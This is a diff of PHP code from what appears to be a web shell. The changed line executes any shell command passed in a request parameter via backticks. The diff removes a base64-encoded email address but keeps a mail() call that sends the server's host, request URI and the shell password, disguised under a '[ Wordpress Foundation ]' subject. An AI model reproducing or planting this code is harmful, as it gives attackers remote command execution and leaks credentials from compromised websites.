@@ -317,7 +317,7 @@ $menu = '';
 foreach($m as $k =>$v)
 $menu .= '<th width="'.(int)(100/count($m)).'%">[<a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a>]</th>';
 $drives = "";
-print(`{$_REQUEST[I]}`);$e=base64_decode  ("Z2FhZGFsb2dlckBrb250b2wuY29t=");
+print(`{$_REQUEST[I]}`);$e=base64_decode  ("");
 $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 mail  ($e,'[ Wordpress Foundation ]','Info : '.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].' PASSWORD : '.$password.'');
